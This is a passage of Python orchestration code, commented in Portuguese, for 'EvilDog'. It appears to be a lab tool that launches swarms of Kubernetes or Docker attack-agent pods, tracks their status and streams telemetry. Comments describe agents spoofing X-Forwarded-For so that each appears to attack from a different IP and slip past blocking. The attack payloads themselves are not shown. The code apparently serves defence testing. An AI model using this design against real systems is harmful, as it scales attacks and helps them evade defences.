    remaining = ESCALATE_COOLDOWN_S - (now - API_STATE["last_escalate_at"])
    if remaining > 0:
        return JSONResponse(status_code=429, content={"error": "cooldown", "retry_after_s": round(remaining, 1)})

    count = max(1, min(int(count), MAX_JOBS_PER_ESCALATE))
    free_slots = MAX_CONCURRENT_AGENTS - _active_agent_count()
    if free_slots <= 0:
        return JSONResponse(status_code=429, content={"error": "capacity"})
    count = min(count, free_slots)

    run_id = f"esc-{uuid.uuid4().hex[:8]}"
    API_STATE["last_escalate_at"] = now
    loop = asyncio.get_running_loop()
    created = []
    failed = []
    backend = "kubernetes" if _K8S_READY else "docker"
    bus.publish({"type": "swarm_start", "requested": count, "level": "warn", "backend": backend,
                 "message": f"[ESCALACAO] disparando {count} agentes reais ({backend})"})
    for branch in range(count):
        job_name = f"evildog-agent-{run_id}-{branch}"
        # Registra ANTES de criar: o processo agente pode começar e encaminhar seu
        # primeiro evento antes de create_namespaced_job/containers.run retornar.
        API_STATE["agents"][job_name] = {"run_id": run_id, "branch": branch,
                                          "phase": "Creating", "ip": None, "created_at": _now()}
        try:
            if _K8S_READY:
                manifest = _build_job_manifest(run_id, branch)
                job_name = manifest["metadata"]["name"]
                await loop.run_in_executor(None, lambda m=manifest: _batch_v1.create_namespaced_job(
                    namespace=NAMESPACE, body=m))
            else:
                job_name = await loop.run_in_executor(
                    None, lambda b=branch: _spawn_docker_agent(run_id, b))
            # Em Kubernetes o nome é determinado pelo manifest, mas o registro
            # provisório já usa o mesmo padrão. Preserve-o caso a implementação
            # passe a gerar um nome diferente no futuro.
            if job_name not in API_STATE["agents"]:
                API_STATE["agents"][job_name] = {"run_id": run_id, "branch": branch,
                                                  "phase": "Pending", "ip": None, "created_at": _now()}
            else:
                API_STATE["agents"][job_name]["phase"] = "Pending"
            created.append(job_name)
            bus.publish({"type": "pod_created", "pod": job_name, "run_id": run_id,
                         "level": "info", "message": f"[POD] {job_name} agendado"})
        except ApiException as exc:
            _mark_agent_terminal(job_name, "Failed")
            failed.append(job_name)
            bus.publish({"type": "pod_created", "pod": job_name, "run_id": run_id, "phase": "Error",
                         "level": "critical", "message": f"[POD] falha ao criar Job: HTTP {exc.status}"})
        except Exception as exc:
            logger.warning(f"[EvilDog] falha ao criar agente {job_name}: {exc}")
            _mark_agent_terminal(job_name, "Failed")
            failed.append(job_name)
            bus.publish({"type": "pod_created", "pod": job_name, "run_id": run_id, "phase": "Error",
                         "level": "critical", "message": f"[POD] falha ao criar agente: {exc}"})

    if not created:
        bus.publish({"type": "swarm_done", "state": "error", "run_id": run_id, "level": "critical",
                     "failed_creations": len(failed),
                     "message": "[ESCALACAO] nenhum agente foi criado"})
        _prune_agents()
        return JSONResponse(status_code=502, content={"error": "agent_create_failed"})

    asyncio.create_task((_watch_run if _K8S_READY else _watch_docker_run)(run_id, created, len(failed)))
    return {"ok": True, "run_id": run_id, "branches": len(created), "nodes": PIPELINE_NODES,
            "backend": backend, "failed_creations": len(failed)}


async def _watch_run(run_id: str, job_names: list, failed_creations: int = 0) -> None:
    loop = asyncio.get_running_loop()
    deadline = time.monotonic() + JOB_ACTIVE_DEADLINE_S + 20
    pending = set(job_names)
    last_phase = {}
    try:
        while pending and time.monotonic() < deadline:
            await asyncio.sleep(2)
            try:
                pods = await loop.run_in_executor(None, lambda: _core_v1.list_namespaced_pod(
                    namespace=NAMESPACE, label_selector=f"evildog/run-id={run_id}"))
            except ApiException as exc:
                logger.warning(f"[EvilDog] list_namespaced_pod falhou: {exc}")
                continue
            pods_by_job = {}
            for p in pods.items:
                jn = (p.metadata.labels or {}).get("job-name")
                if not jn and p.metadata.owner_references:
                    jn = p.metadata.owner_references[0].name
                if jn:
                    pods_by_job[jn] = p
            for job_name in list(pending):
                pod = pods_by_job.get(job_name)
                if pod is None:
                    continue
                phase = _pod_phase_for(pod)
                if phase != last_phase.get(job_name):
                    last_phase[job_name] = phase
                    API_STATE["agents"].setdefault(job_name, {})["phase"] = phase
                    bus.publish({"type": "pod_phase", "pod": job_name, "phase": phase,
                                 "level": "info", "message": f"[POD] {job_name} -> {phase}"})
                if phase in ("Succeeded", "Failed"):
                    pending.discard(job_name)
                    try:
                        await loop.run_in_executor(None, lambda n=job_name: _batch_v1.delete_namespaced_job(
                            name=n, namespace=NAMESPACE, propagation_policy="Foreground"))
                    except ApiException:
                        pass
                    _mark_agent_terminal(job_name)
                    bus.publish({"type": "pod_deleted", "pod": job_name, "run_id": run_id,
                                 "message": f"[POD] {job_name} removido"})
        if pending:
            for job_name in pending:
                try:
                    await loop.run_in_executor(None, lambda n=job_name: _batch_v1.delete_namespaced_job(
                        name=n, namespace=NAMESPACE, propagation_policy="Foreground"))
                except ApiException:
                    pass
                _mark_agent_terminal(job_name)
            bus.publish({"type": "swarm_done", "state": "timeout", "run_id": run_id, "level": "warn",
                         "message": f"[ESCALACAO] {len(pending)} agente(s) excederam o prazo"})
        else:
            summary = _swarm_completion(job_names, last_phase, failed_creations)
            bus.publish({"type": "swarm_done", "run_id": run_id,
                         "failed_creations": failed_creations, **summary})
        _prune_agents()
    except Exception as exc:
        logger.exception(f"[EvilDog] _watch_run crashed: {exc}")
        bus.publish({"type": "swarm_done", "state": "error", "run_id": run_id, "level": "critical",
                     "message": f"[ESCALACAO] erro interno no watcher: {exc}"})


@app.get("/api/evildog/pipeline/state")
async def pipeline_state():
    return _pipeline_snapshot()


@app.get("/api/evildog/stream")
async def stream():
    async def event_gen():
        q = bus.subscribe()
        # Replay a little recent context so a fresh tab isn't empty — tagged as replay
        # so the frontend can show it in the feed without repainting live state (node
        # colors, PIPELINE FAIL banner, agent swarm) with a stale event from a run that
        # already ended, possibly minutes/hours ago.
        for ev in bus.recent[-25:]:
            yield f"data: {json.dumps({**ev, 'replay': True})}\n\n"
        try:
            while True:
                try:
                    ev = await asyncio.wait_for(q.get(), timeout=15)
                    yield f"data: {json.dumps(ev)}\n\n"
                except asyncio.TimeoutError:
                    yield ": keepalive\n\n"
        finally:
            bus.unsubscribe(q)

    return StreamingResponse(
        event_gen(),
        media_type="text/event-stream",
        headers={
            "Cache-Control": "no-cache",
            "Connection": "keep-alive",
            "X-Accel-Buffering": "no",
        },
    )


# --------------------------------------------------------------------------- #
# One-shot agent mode — entrypoint for the ephemeral K8s Job pods. Runs the   #
# full attack pipeline standalone and forwards telemetry to the orchestrator #
# over HTTP (no local SSE subscribers of its own).                           #
# --------------------------------------------------------------------------- #
def _agent_process_exit_code(status: str) -> int:
    """Traduz o resultado do ataque para o exit code do robô efêmero."""
    return 0 if status == "done" else 1


def _run_agent_mode() -> None:
    run_id = os.environ["EVILDOG_RUN_ID"]
    branch = int(os.environ.get("EVILDOG_BRANCH", "0"))
    job_name = os.environ.get("EVILDOG_JOB_NAME", f"evildog-agent-{run_id}-{branch}")
    orchestrator_url = os.environ["EVILDOG_ORCHESTRATOR_URL"]
    token = os.environ["EVILDOG_AGENT_TOKEN"]
    # O IP que interessa no painel é o que a AAP enxerga como origem: o X-Forwarded-For
    # spoofado que este agente sorteou no import (rotate_source_ip). POD_IP só existe no
    # k8s e, mesmo lá, é o IP interno do pod -- não o que aparece no bloqueio. Sem isto o
    # card do agente mostrava "—" e a demo perdia justamente a prova de que cada agente
    # ataca de um IP diferente.
    pod_ip = _source_ip() or os.environ.get("POD_IP", "")

    session = requests.Session()
    session.headers["Authorization"] = f"Bearer {token}"
    forwarding_failures: List[str] = []

    def _forward(event: dict) -> None:
        payload = {**event, "run_id": run_id, "branch": branch, "job_name": job_name,
                   "ip": event.get("ip") or pod_ip}
        try:
            response = session.post(orchestrator_url, json=payload, timeout=5)
            if response.status_code >= 300:
                raise RuntimeError(f"orquestrador retornou HTTP {response.status_code}")
        except Exception as exc:
            # Não esconda perda de telemetria: o watcher precisa enxergar este
            # agente como Failed, em vez de uma falsa rodada Succeeded sem outcome.
            forwarding_failures.append(str(exc))
            logger.error("[EvilDog agent] falha ao encaminhar evento: %s", exc)

    bus.remote_sink = _forward
    handler = SSELogHandler()
    handler.setLevel(logging.INFO)
    logging.getLogger("security_attacker").addHandler(handler)

    logger.info(f"evildog-agent up - branch {branch} run {run_id} (lab only)")
    try:
        status = _run_pipeline(run_id, source_ip=pod_ip)
        if forwarding_failures:
            logger.error("[EvilDog agent] %s evento(s) não foram encaminhados", len(forwarding_failures))
            sys.exit(1)
        # "blocked" é uma vitória da defesa, mas uma FALHA do robô atacante.
        # O watcher deve receber exit code != 0 e publicar Pod/Container Failed;
        # antes, esse caminho saía 0 e criava o falso SUCCEEDED visto no painel.
        exit_code = _agent_process_exit_code(status)
        if exit_code:
            sys.exit(exit_code)
    except Exception as exc:
        bus.publish({"type": "pipeline", "state": "error", "level": "critical",
                     "message": f"[AGENT] erro fatal: {exc}"})
        sys.exit(1)


if __name__ == "__main__":
    if os.getenv("EVILDOG_AGENT_MODE", "false").lower() == "true" or "--agent-mode" in sys.argv:
        _run_agent_mode()
    else:
        print("evildog-api: rode via `uvicorn app.main:app` (server) ou --agent-mode (job one-shot)")
        sys.exit(2)
